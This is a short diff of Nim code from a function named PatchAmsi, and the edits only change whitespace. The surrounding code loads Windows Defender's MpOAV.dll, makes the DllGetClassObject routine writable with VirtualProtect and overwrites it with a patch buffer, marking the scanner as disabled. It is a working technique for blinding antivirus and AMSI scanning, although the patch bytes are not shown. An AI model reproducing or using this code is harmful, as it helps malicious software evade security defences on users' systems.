@@ -104,15 +104,13 @@ proc PatchAmsi(): bool =
     
     amsi = LoadLibrary(fmt"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\{filesInPath[length-1].path}\\MpOAV.dll")
     if amsi == 0:
-        
         return disabled
+
     cs = GetProcAddress(amsi,"DllGetClassObject")
-    if cs == nil:
-        
+    if cs == nil:  
         return disabled
 
     if VirtualProtect(cs, patch.len, 0x40, addr op):
-        
         copyMem(cs, unsafeAddr patch, patch.len)
         VirtualProtect(cs, patch.len, op, addr t)
         disabled = true
